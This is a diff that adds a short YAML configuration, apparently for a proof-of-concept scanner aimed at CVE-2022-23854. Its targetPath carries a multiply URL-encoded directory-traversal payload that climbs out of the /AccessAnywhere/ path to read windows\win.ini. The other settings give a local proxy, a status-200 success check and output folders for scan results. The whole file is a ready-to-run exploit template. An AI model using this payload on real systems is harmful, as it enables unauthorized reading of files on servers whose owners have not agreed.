@@ -1,0 +1,16 @@
+targetPath: /AccessAnywhere/%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255c%25252e%25252e%25255cwindows%25255cwin.ini
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    Accept: application/json, text/plain, */*
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/CVE_2022_23854/
+targetRestText: 2
